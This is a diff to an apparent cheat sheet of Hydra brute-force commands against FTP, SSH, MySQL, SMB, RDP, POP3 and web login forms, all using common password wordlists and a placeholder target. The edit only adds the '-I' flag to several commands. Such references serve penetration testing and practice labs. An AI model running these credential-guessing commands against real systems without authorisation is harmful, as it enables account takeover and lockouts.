@@ -14,7 +14,7 @@ $ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-for
 
 ## FTP
 
-$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
+$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp -I
 
 $ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 12021 ftp
 
@@ -32,7 +32,7 @@ $ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ssh
 
 ## MySQL
 
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 mysql
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 mysql -I
 
 ## SMB
 
@@ -40,7 +40,7 @@ $ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb
 
 ## RDP
 
-$ hydra -f -l username -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 rdp
+$ hydra -f -l username -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 rdp -I
 
 $ hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP -s 53389 rdp
 
@@ -48,7 +48,7 @@ $ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt -t 
 
 ## POP3
 
-$ hydra -f -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP pop3
+$ hydra -f -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP pop3 -I
 
 $ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP -s 10110 pop3
 
